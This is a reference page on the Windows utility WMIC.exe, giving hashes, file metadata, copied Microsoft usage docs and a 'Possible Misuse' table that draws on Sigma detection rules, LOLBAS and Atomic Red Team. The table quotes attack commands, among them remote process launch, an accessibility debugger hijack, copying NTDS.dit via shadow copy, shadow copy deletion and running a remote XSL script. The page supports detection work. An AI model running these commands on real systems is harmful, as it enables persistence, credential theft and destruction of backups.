---
title: WMIC.exe | WMI Commandline Utility
excerpt: What is WMIC.exe?
---

# WMIC.exe 

* File Path: `C:\windows\SysWOW64\wbem\WMIC.exe`
* Description: WMI Commandline Utility

## Hashes

Type | Hash
-- | --
MD5 | `C0EEC0815A343B93969777DE7EDCAA60`
SHA1 | `1D73D0DDB044D3FCE0BDCC4F9CE809788BC62885`
SHA256 | `42497534CDF28B26CE51A2DC26E5E5262E403CD512B725D47DF97B43A6FF21FB`
SHA384 | `FA631CE2189322DF092B9082524BAD4D1230EB5F354A2D19805B5BA6B1384078C2943328EAEA9C903C0D322865239048`
SHA512 | `9185AF2801E70386151DCF53B75AB2AFB5CE40925E7744DBC2E7799DCEF2C02C9FC827E6B2634804A2F0352666B98922A0AE62F6E8B0A1BBB1892A8827C13478`
SSDEEP | `6144:PbRIzRjVMXh7waxnU0X/wfwjA/dn4pDYGH5enhEPi:PbHxjX/QBN4RYGH0nhyi`

## Signature

* Status: The file C:\windows\SysWOW64\wbem\WMIC.exe is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170
* Serial: ``
* Thumbprint: ``
* Issuer: 
* Subject: 

## File Metadata

* Original Filename: wmic.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 6.3.9600.16384 (winblue_rtm.130821-1623)
* Product Version: 6.3.9600.16384
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `WMIC.exe` being misused. While `WMIC.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [godmode_sigma_rule.yml](https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_dbghelp_dbgcore_load.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_suspicious_dbghelp_dbgcore_load.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mal_blue_mockingbird.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/malware/win_mal_blue_mockingbird.yml) | `Image\|endswith: '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_bypass_squiblytwo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_bypass_squiblytwo.yml) | `- '*\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_crime_maze_ransomware.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_crime_maze_ransomware.yml) | `Image\|endswith: '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_html_help_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_local_system_owner_account_discovery.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_local_system_owner_account_discovery.yml) | `- Image\|endswith: '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml) | `- '*\wmic.exe'  # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- 'wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- "wmic.exe"` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- '*\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_shadow_copies_creation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_creation.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_shadow_copies_deletion.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_eventlog_clear.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_eventlog_clear.yml) | `Image\|endswith: '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_wmi_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_wmi_execution.yml) | `- '*\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_xsl_script_processing.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_xsl_script_processing.yml) | `- Image\|endswith: '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_xsl_script_processing.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_xsl_script_processing.yml) | `- WMIC.exe FP depend on scripts and administrative methods used in the monitored environment` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `Name: Wmic.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe process call create "c:\ads\file.txt:program.exe"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe process call create calc` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe /node:"192.168.0.1" process call create "evil.exe"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Path: C:\Windows\System32\wbem\wmic.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Path: C:\Windows\SysWOW64\wbem\wmic.exe` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1047.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md) | This test uses wmic.exe to execute a process on the local host. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1047.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md) | This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1220.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.md) | \| wmic_command \| WMI command to execute using wmic.exe \| string \| process list\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1490.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md) | wmic.exe shadowcopy delete | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## wmic



Displays WMI information inside an interactive command shell.



### Syntax

```
wmic </parameter>
```

### Sub-commands

The following sub-commands are available at all times:

|Sub-command|Description|
|-----------|-----------|
|class|Escapes from the default alias mode of WMIC to access classes in the WMI schema directly.|
|path|Escapes from the default alias mode of WMIC to access instances in the WMI schema directly.|
|context|Displays the current values of all global switches.|
|[quit \| exit]|Exits the WMIC command shell.|

### Examples

To display the current values of all global switches, type:
```
wmic context
```
Output similar to the following displays:
```
NAMESPACE    : root\cimv2
ROLE         : root\cli
NODE(S)      : BOBENTERPRISE
IMPLEVEL     : IMPERSONATE
[AUTHORITY   : N/A]
AUTHLEVEL    : PKTPRIVACY
LOCALE       : ms_409
PRIVILEGES   : ENABLE
TRACE        : OFF
RECORD       : N/A
INTERACTIVE  : OFF
FAILFAST     : OFF
OUTPUT       : STDOUT
APPEND       : STDOUT
USER         : N/A
AGGREGATE    : ON
```
To change the language ID used by the command line to English (locale ID 409), type:
```
wmic /locale:ms_409
```

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

---



MIT License. Copyright (c) 2020 Strontic.


